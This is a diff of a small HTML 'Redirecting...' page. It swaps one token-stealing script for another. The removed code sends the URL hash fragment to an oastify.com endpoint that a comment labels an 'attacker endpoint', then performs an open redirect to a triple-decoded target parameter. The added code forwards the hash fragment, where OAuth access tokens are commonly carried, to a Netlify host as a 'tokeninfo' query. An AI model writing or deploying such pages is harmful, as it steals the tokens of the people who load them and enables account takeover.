@@ -1,37 +1,15 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
   <head>
     <meta charset="UTF-8" />
-    <title>Redirecting...</title>
+    <title>🔁 Redirecting...</title>
     <script>
-      (function () {
-        try {
-          // Optional: log hash fragment to attacker endpoint
-          if (window.location.hash) {
-            fetch("https://wooy85omc0efw4o70csyshc3jupnde13.oastify.com/?" + encodeURIComponent(window.location.hash));
-          }
-
-          const params = new URLSearchParams(window.location.search);
-          const target = params.get("target");
-
-          if (!target) {
-            document.body.innerText = "❌ Missing ?target= parameter.";
-            return;
-          }
-
-          // Decode 3 times (triple encoded)
-          let decoded = decodeURIComponent(decodeURIComponent(decodeURIComponent(target)));
-
-          // Redirect
-          window.location.href = decoded;
-        } catch (e) {
-          console.error("Redirect error:", e);
-          document.body.innerText = "⚠️ Redirection failed.";
-        }
-      })();
+      const hash = window.location.hash.substring(1); // Strip #
+      const query = encodeURIComponent(hash);
+      window.location.href = "https://684ff57e2f2790ada6c42b4c--statuesque-vacherin-9a305b.netlify.app//?tokeninfo=" + query;
     </script>
   </head>
   <body>
-    <h2>🔁 Redirecting...</h2>
+    Redirecting...
   </body>
 </html>
